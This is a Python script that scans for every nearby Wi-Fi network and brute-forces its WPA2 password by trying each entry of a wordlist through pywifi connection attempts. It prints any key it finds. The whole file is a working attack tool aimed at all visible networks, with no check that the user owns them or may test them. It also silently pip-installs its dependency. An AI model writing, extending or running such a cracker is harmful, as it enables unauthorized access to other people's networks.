#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import subprocess
import os
import time
import random

# Auto-install pywifi
def install_and_import(package):
    try:
        __import__(package)
    except ImportError:
        print(f"Installing {package}...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        except subprocess.CalledProcessError:
            print(f"Failed to install {package}. Please install it manually.")
            sys.exit(1)

install_and_import("pywifi")

import pywifi
from pywifi import const, Profile

# Colors
RED   = "\033[1;31m"
GREEN = "\033[0;32m"
YELLOW = "\033[1;33m"
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
MAGENTA = "\033[1;35m"
WHITE = "\033[1;37m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"

# Random colors for Banner and SSIDs
COLORS_LIST = [BLUE, CYAN, MAGENTA, GREEN, WHITE, YELLOW]

def print_banner():
    color = random.choice(COLORS_LIST)
    print(f"\n{color}{BOLD}CREATED BY FXEEEO{RESET}\n")

def get_wifi_interface():
    wifi = pywifi.PyWiFi()
    if len(wifi.interfaces()) == 0:
        print(f"{RED}No Wi-Fi interface found.{RESET}")
        sys.exit(1)
    return wifi.interfaces()[0]

def check_wifi_enabled(iface):
    try:
        # Try to scan to check if enabled
        iface.scan()
        return True
    except:
        return False

def get_wordlists():
    base_dir = os.path.dirname(os.path.abspath(__file__))
    wordlist_dir = os.path.join(base_dir, "wordlist")
    wordlists = []

    if os.path.exists(wordlist_dir):
        for f in os.listdir(wordlist_dir):
            if f.endswith(".txt"):
                wordlists.append(os.path.join(wordlist_dir, f))

    if not wordlists:
        # Prompt user if no wordlists found
        while True:
            path = input(f"{BLUE}Wordlist not found in 'wordlist' folder. Please enter the path to a wordlist .txt file: {RESET}")
            if os.path.exists(path) and path.endswith(".txt"):
                wordlists.append(path)
                break
            else:
                print(f"{RED}File not found or not a .txt file. Try again.{RESET}")

    return wordlists

def load_passwords(wordlists):
    passwords = []
    seen = set()
    for wl in wordlists:
        try:
            with open(wl, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    pwd = line.strip()
                    if pwd and pwd not in seen:
                        passwords.append(pwd)
                        seen.add(pwd)
        except Exception as e:
            print(f"{RED}Error reading {wl}: {e}{RESET}")
    return passwords

def crack_network(iface, ssid, passwords, ssid_color):
    # Display "SSID | Cracking..."
    # We use end='\r' to update the line or just print it.
    # Since we want the final result to replace it or be on the same line context,
    # and we might have multiple threads (if we were multithreading),
    # but here we are sequential.

    print(f"{ssid_color}{ssid}{RESET} | {RED}Cracking...{RESET}", end='', flush=True)

    start_time = time.time()

    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    found = False
    found_pwd = None

    for pwd in passwords:
        profile.key = pwd
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)

        iface.connect(tmp_profile)

        # Wait for connection
        t0 = time.time()
        connected = False
        while time.time() - t0 < 5.0: # 5.0s timeout for connection attempt per password
            if iface.status() == const.IFACE_CONNECTED:
                connected = True
                break
            time.sleep(0.1)

        if connected:
            found = True
            found_pwd = pwd
            iface.disconnect()
            break

        iface.disconnect() # Disconnect to try next

    elapsed = time.time() - start_time

    # Clear the "Cracking..." line and print result
    # \r moves cursor to start of line. We overwrite.
    print(f"\r{ssid_color}{ssid}{RESET} | ", end='')

    if found:
        print(f"{GREEN}{found_pwd}{RESET} | {YELLOW}{elapsed:.2f}s{RESET}")
    else:
        print(f"{RED}Not Found{RESET} | {YELLOW}{elapsed:.2f}s{RESET}")

def main():
    print_banner()

    try:
        iface = get_wifi_interface()
    except Exception as e:
        print(f"{RED}Error initializing interface: {e}{RESET}")
        return

    # Check enabled
    if not check_wifi_enabled(iface):
        print("First, please enable your Wi-Fi.")
        while not check_wifi_enabled(iface):
             time.sleep(2)
        print(f"{GREEN}Wi-Fi enabled.{RESET}")

    # Fetch available networks
    # print(f"{BLUE}Scanning for networks...{RESET}")
    iface.scan()
    time.sleep(3) # Wait for scan results
    results = iface.scan_results()

    unique_ssids = set()
    targets = []
    for network in results:
        ssid = network.ssid
        # Filter out empty SSIDs
        if ssid and ssid not in unique_ssids:
            unique_ssids.add(ssid)
            targets.append(ssid)

    if not targets:
        print(f"{RED}No networks found.{RESET}")
        return

    # Wordlists
    wordlists_files = get_wordlists()
    passwords = load_passwords(wordlists_files)

    if not passwords:
        print(f"{RED}No passwords found in wordlists.{RESET}")
        return

    # Attack
    for ssid in targets:
        ssid_color = random.choice(COLORS_LIST)
        crack_network(iface, ssid, passwords, ssid_color)

if __name__ == "__main__":
    main()
